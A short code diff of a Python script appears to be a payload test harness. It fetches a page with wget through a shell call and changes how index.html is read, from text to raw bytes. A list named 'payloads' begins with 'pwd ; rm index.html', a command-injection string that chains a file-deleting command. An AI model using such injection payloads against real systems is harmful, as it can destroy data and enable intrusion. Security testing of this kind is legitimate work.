@@ -15,7 +15,7 @@ if os.path.isfile('index.html'):
 print(subprocess.check_output(wget, shell=True).decode())
 
 # Need to split into bytes to ensure multi-byte chars are handled correctly
-fin = bytearray(open('index.html').read().encode())
+fin = bytearray(open('index.html', 'rb').read())
 
 payloads = [
     'pwd ; rm index.html',
